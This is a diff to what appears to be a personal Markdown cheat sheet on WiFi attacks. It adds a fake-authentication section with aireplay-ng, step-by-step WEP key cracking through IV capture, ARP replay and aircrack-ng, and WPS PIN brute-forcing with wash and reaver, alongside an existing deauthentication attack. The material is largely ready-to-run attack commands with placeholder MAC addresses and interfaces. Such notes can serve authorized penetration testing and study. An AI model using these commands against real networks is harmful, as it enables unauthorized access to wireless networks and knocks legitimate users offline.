@@ -84,7 +84,7 @@ airodump-ng <INTERFACE>
 
 <a name="deauth"/>
 
-## Deauth Attack with `aireplay-ng`
+## De-auth Attack with `aireplay-ng`
 
 **USAGE** : `aireplay-ng --deauth <#DEAUTH_PACKETS> -a <NETWORK_MAC> -c <TARGET_MAC> <INTERFACE>`
 
@@ -96,6 +96,17 @@ example :
 aireplay-ng --deauth 100000 -a 11:22:33:44:55:66 -c 00:11:22:33:44:55 mon0
 ```
 
+<a name="fakeauth" />
+
+## Fake-auth Attack with `aireplay-ng`
+
+**USAGE** : `aireplay-ng --fakeauth <#FAKEAUTH_PACKETS> -a <NETWORK_MAC> -h <INTERFACE_MAC> <INTERFACE>`
+
+example:
+```bash
+aireplay-ng --fakeauth 0 -a 11:22:33:44:55:66 -h 00:11:22:33:44:55 mon0
+```
+
 <a name="wifipasscrack"/>
 
 ## WIFI password cracking
@@ -104,9 +115,56 @@ aireplay-ng --deauth 100000 -a 11:22:33:44:55:66 -c 00:11:22:33:44:55 mon0
 
 ### WEP
 
-TODO
+**DESC** : WEP is a very basics RC4 encryption method. that use a random Initialisation Vector (IV) of only from 24 bits to 128 bits\
+WEP = Wired Equivalent Privacy\
+`IV + Password = Key Stream`\
+In order to get the Password we will perform statistics on packets\
+IV is added at the beginning of each packet send to the router
 
+#### If network is busy
+
+1. [Change wireless mode](#changewirelessmode) to monitor
+2. [Sniff packets](#snif) with on a specific bssid and channel (Capture a lot of `#Data` / IVs) and save them in a file <FILE_NAME>.cap
+3. Analyse captured IVs by running
+  ```bash
+  aircrack-ng <FILE_NAME>.cap
+  ```
+
+#### If network is not busy
+
+We will perform an association (not connection) to force the network to send IVs
+
+1. [Change wireless mode](#changewirelessmode) to monitor
+2. [Sniff packets](#snif) with on a specific bssid and channel (Capture a lot of `#Data` / IVs) and save them in a file <FILE_NAME>.cap
+3. Do one [Fake Authentification Attack](#fakeauth)
+4. Wait for an `ARP` packet, and use it to force network to create new IVs
+    ```bash
+    aireplay-ng --arpreplay -b <NETWORK_MAC> -h <INTERFACE_MAC> <INTERFACE>
+    ```
+5. Then Analyse captured IVs by running
+    ```bash
+    aircrack-ng <FILE_NAME>.cap
+    ```
+   
 <a name="wap"/>
+
+### WPS
+
+**DESC** : WPS is not a type of encryption but it's a method to connect without entering password\
+Used by some printer and easy connect with a WPS button on the router\
+We will bruteforce the password
+
+1. [Change wireless mode](#changewirelessmode) to monitor
+2. Router must be on WPS "auto" not "pushed"
+3. List WPS available
+    ```bash
+     wash --interface <INTERFACE>
+     ```
+4. Do Some (30) [Fake Authentification Attack](#fakeauth)
+5. Bruteforce with `reaver`
+    ```bash
+    reaver --bssid <NETWORK_MAC> --channel <CHANNEL> --interface <INTERFACE> -vvv --no-associate
+    ```
 
 ### WAP
 
